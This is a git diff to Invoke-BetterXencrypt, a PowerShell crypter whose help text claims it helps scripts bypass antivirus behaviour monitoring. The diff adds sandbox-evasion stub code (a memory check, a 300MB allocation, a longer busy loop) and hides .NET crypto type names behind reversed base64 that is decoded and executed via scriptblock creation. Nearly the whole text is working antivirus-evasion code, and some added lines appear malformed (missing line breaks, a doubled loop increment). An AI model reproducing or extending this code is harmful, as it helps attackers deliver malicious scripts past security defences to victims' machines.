@@ -6,7 +6,7 @@ function Create-Var() {
         #Variable length help vary the length of the file generated
         #old: [guid]::NewGuid().ToString().Substring(24 + (Get-Random -Maximum 9))
         $set = "abcdefghijkmnopqrstuvwxyz"
-        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 5 -Maximum $set.Length)] } ) -join ''
+        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 6 -Maximum $set.Length)] } ) -join ''
 }
 
 function Invoke-BetterXencrypt {
@@ -29,7 +29,7 @@ function Invoke-BetterXencrypt {
      The output script is highly randomized in order to make static analysis even more difficut.
      It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
      Not only that,Invoke-BetterXencrypt-ed script can bypass any behavior monitoring from AVs
-     Version : v1.0.0
+     Version : v1.1.0
     .PARAMETER InFile
     Specifies the script to encrypt.
     .PARAMETER OutFile
@@ -52,6 +52,7 @@ function Invoke-BetterXencrypt {
         [string] $iterations = 2
     )
     Process {
+        # a good tool need a good banner ;)
         $banner = @"
  ____       _   _          __  __                                _   
 | __ )  ___| |_| |_ ___ _ _\ \/ /___ _ __   ___ _ __ _   _ _ __ | |_ 
@@ -143,9 +144,11 @@ function Invoke-BetterXencrypt {
             $stub_template = ''
 
             $code_alternatives  = @()
+            $code_alternatives += '${30} = (Get-Process -Id $PID | Select-Object Name,@{17}Name="WorkingSet";Expression={17}($_.ws / 1024kb){18}{18}).WorkingSet' + "`r`n"
+            $code_alternatives += 'if (${30} -lt 250) {17} ${31} = "a" * 300MB {18}' + "`r`n"
             $code_alternatives += '${19} = 0' + "`r`n"
-            $code_alternatives += '${20} = 15000000' + "`r`n" 
-            $code_alternatives += 'For (${19}=0; ${19} -lt ${20}) {17} ${19}++ {18}' + "`r`n"
+            $code_alternatives += '${20} = 30000000' + "`r`n" 
+            $code_alternatives += 'For (${19}=0; ${19} -lt ${20};${19}++) {17} ${19}++ {18}' + "`r`n"
             $stub_template += $code_alternatives -join ''
 
             $code_alternatives  = @()
@@ -158,37 +161,65 @@ function Invoke-BetterXencrypt {
             $code_alternatives  = @()
             $code_alternatives += '${2} = [System.Convert]::FromBase64String("${10}")' + "`r`n"
             $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
-            #aes managed but its base64 encoded ;)
-            $code_alternatives += '${12} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNNYW5hZ2VkCg=="))' + "`r`n"
+            #aes managed but its base64 encoded and reversed ;)
+            $code_alternatives += '${24} = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"'  + "`r`n"
+            $code_alternatives += '${25} = ${24}.ToCharArray()'  + "`r`n"
+            $code_alternatives += '[array]::Reverse(${25})'  + "`r`n"
+            $code_alternatives += '${26} = -join(${25})'  + "`r`n"
+            $code_alternatives += '${12} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${26}))' + "`r`n"
             $code_alternatives += '${4} = New-Object "${12}"' + "`r`n"
             $stub_template += $code_alternatives -join ''
 
             $code_alternatives  = @()
-            #ciphermode but its base64 encoded ;)
+            #ciphermode but its base64 encoded and reversed ;)
             if ($ciphermode -eq "ECB") {
-                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkVDQg=="))' + "`r`n"
+                $code_alternatives += '${21} = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
+                $code_alternatives += '${23} = ${21}.ToCharArray()'  + "`r`n"
+                $code_alternatives += '[array]::Reverse(${23})' + "`r`n"
+                $code_alternatives += '${22} = -join(${23})' + "`r`n"
+                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${22}))' + "`r`n"
                 $code_alternatives += '${14} = & ([scriptblock]::Create(${13}))' + "`r`n"
                 $code_alternatives += '${4}.Mode = ${14}' + "`r`n"
             }elseif ($ciphermode -eq "CBC") {
-                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQw=="))' + "`r`n"
+                $code_alternatives += '${21} = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
+                $code_alternatives += '${23} = ${21}.ToCharArray()'  + "`r`n"
+                $code_alternatives += '[array]::Reverse(${23})' + "`r`n"
+                $code_alternatives += '${22} = -join(${23})' + "`r`n"
+                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${22}))' + "`r`n"
                 $code_alternatives += '${14} = & ([scriptblock]::Create(${13}))' + "`r`n"
                 $code_alternatives += '${4}.Mode = ${14}' + "`r`n"
             }
-            #paddingmode but its base64 encoded ;)
+            #paddingmode but its base64 encoded and reversed ;)
             if ($paddingmode -eq 'PKCS7') {
-                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpQS0NTNw=="))' + "`r`n"
+                $code_alternatives += '${27} = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"'
+                $code_alternatives += '${28} = ${27}.ToCharArray()'
+                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
+                $code_alternatives += '${29} = -join(${28})' + "`r`n"
+                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"
                 $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                 $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
             } elseif ($paddingmode -eq 'ISO10126') {
-                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpJU08xMDEyNg=="))' + "`r`n"
+                $code_alternatives += '${27} = "==gNyEDMx80UJpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
+                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
+                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
+                $code_alternatives += '${29} = -join(${28})' + "`r`n"
+                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"                
                 $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                 $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
             } elseif ($paddingmode -eq 'ANSIX923') {
-                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpBTlNJWDkyMw=="))' + "`r`n"
+                $code_alternatives += '${27} = "==wMykDWJNlTBpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
+                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
+                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
+                $code_alternatives += '${29} = -join(${28})' + "`r`n"
+                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"    
                 $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                 $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
             } elseif ($paddingmode -eq 'Zeros') {
-                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcw=="))' + "`r`n"
+                $code_alternatives += '${27} = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
+                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
+                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
+                $code_alternatives += '${29} = -join(${28})' + "`r`n"
+                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"
                 $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                 $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
             }
@@ -221,7 +252,7 @@ function Invoke-BetterXencrypt {
             
         
             # it's ugly, but it beats concatenating each value manually.
-            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var)
+            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
             $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
         }
         Write-Output "[*] Writing '$($outfile)' ..."
